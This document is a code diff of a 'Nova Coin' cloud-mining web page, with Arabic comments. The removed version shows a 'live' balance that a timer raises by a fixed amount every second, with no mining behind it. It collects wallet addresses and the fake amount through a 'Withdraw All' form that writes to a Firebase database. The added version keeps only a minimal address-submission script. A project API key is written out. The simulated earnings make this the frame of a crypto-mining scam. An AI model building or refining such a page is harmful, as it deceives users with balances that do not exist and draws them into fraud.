@@ -1,98 +1,41 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nova Coin | Cloud Mining</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="bg-[#0b0e11] text-white p-6 font-sans">
-    <div class="max-w-md mx-auto space-y-6">
-        <div class="bg-[#1a1c23] p-10 rounded-3xl text-center border border-emerald-500/20 shadow-2xl">
-            <h2 class="text-emerald-500 font-bold mb-2 tracking-widest uppercase text-xs">Nova Live Miner</h2>
-            <div id="liveBalance" class="text-5xl font-bold text-emerald-400 mb-2">0.000000</div>
-            <p class="text-gray-500 text-[10px] uppercase tracking-widest">Global Server Sync</p>
-        </div>
+<script type="module">
+  // 1. استيراد الأدوات
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        <div class="bg-[#1a1c23] p-8 rounded-3xl border border-white/5 shadow-xl">
-            <h3 class="font-bold mb-6 text-sm flex items-center gap-2"><span>💳</span> Withdrawal Portal</h3>
-            <div class="space-y-4">
-                <select id="userWalletType" class="w-full bg-[#0b0e11] border border-white/10 p-4 rounded-xl outline-none focus:border-emerald-500">
-                    <option value="Trust Wallet">Trust Wallet</option>
-                    <option value="Binance (BEP-20)">Binance (BEP-20)</option>
-                    <option value="FaucetPay">FaucetPay</option>
-                </select>
-                <input id="userAddress" type="text" placeholder="Wallet Address (0x...)" 
-                    class="w-full bg-[#0b0e11] border border-white/10 p-4 rounded-xl outline-none focus:border-emerald-500">
-                <button id="submitNovaWithdraw" class="w-full bg-emerald-500 text-black font-bold py-4 rounded-2xl active:scale-95 transition-all">
-                    Withdraw All
-                </button>
-            </div>
-        </div>
-    </div>
+  // 2. إعدادات مشروعك
+  const firebaseConfig = {
+    apiKey: "AIzaSyCDIizIvd_7nUT6B4sGIc_s-CnZ5hQECCg",
+    authDomain: "pay-coins.firebaseapp.com",
+    projectId: "pay-coins",
+    storageBucket: "pay-coins.firebasestorage.app",
+    messagingSenderId: "279908586614",
+    appId: "1:279908586614:web:632ce326f8b3a0e0e47b57"
+  };
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+  // 3. تشغيل Firebase
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
 
-        const firebaseConfig = {
-          apiKey: "AIzaSyCDIizIvd_7nUT6B4sGIc_s-CnZ5hQECCg",
-          authDomain: "pay-coins.firebaseapp.com",
-          projectId: "pay-coins",
-          storageBucket: "pay-coins.firebasestorage.app",
-          messagingSenderId: "279908586614",
-          appId: "1:279908586614:web:632ce326f8b3a0e0e47b57",
-          measurementId: "G-SG3W4FH9DC"
-        };
+  // 4. وظيفة الزر (تنهي Processing وترسل البيانات)
+  window.withdrawAll = async function() {
+    const address = document.getElementById('wallet-address').value;
+    if (!address) { alert("Please enter address"); return; }
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+    const btn = document.querySelector('.withdraw-btn');
+    btn.innerText = "Processing..."; // سيبدأ هنا
 
-        let coinBalance = 0.000000;
-        const balanceElement = document.getElementById('liveBalance');
-        setInterval(() => {
-            coinBalance += 0.000042; 
-            if(balanceElement) balanceElement.innerText = coinBalance.toFixed(6);
-        }, 1000);
-
-        const withdrawBtn = document.getElementById('submitNovaWithdraw');
-        
-        if(withdrawBtn) {
-            withdrawBtn.onclick = async () => {
-                const wallet = document.getElementById('userWalletType').value;
-                const address = document.getElementById('userAddress').value.trim();
-
-                if (!address || address.length < 10) {
-                    alert("❌ Error: Please enter a valid wallet address.");
-                    return;
-                }
-
-                withdrawBtn.disabled = true;
-                withdrawBtn.innerText = "Processing..."; // تم تغيير الرسالة للتأكد من التحديث
-
-                try {
-                    // إرسال البيانات مباشرة مع معالجة الوقت
-                    const docRef = await addDoc(collection(db, "withdrawals"), {
-                        wallet: wallet,
-                        address: address,
-                        amount: coinBalance.toFixed(6),
-                        status: "Pending",
-                        timestamp: serverTimestamp()
-                    });
-
-                    console.log("Document written with ID: ", docRef.id);
-                    withdrawBtn.innerText = "✅ Request Sent!";
-                    withdrawBtn.style.backgroundColor = "#3b82f6";
-                    alert("Success! Your request has been recorded.");
-                    
-                } catch (e) {
-                    console.error("Error: ", e);
-                    withdrawBtn.disabled = false;
-                    withdrawBtn.innerText = "Retry Withdrawal";
-                    alert("Firebase Error: " + e.message);
-                }
-            };
-        }
-    </script>
-</body>
-</html>
+    try {
+      await addDoc(collection(db, "withdrawals"), {
+        address: address,
+        timestamp: serverTimestamp()
+      });
+      btn.innerText = "✅ Success!"; // سينتهي هنا بنجاح
+      alert("Request Sent!");
+    } catch (e) {
+      console.error(e);
+      btn.innerText = "Withdraw All";
+      alert("Error: " + e.message);
+    }
+  }
+</script>
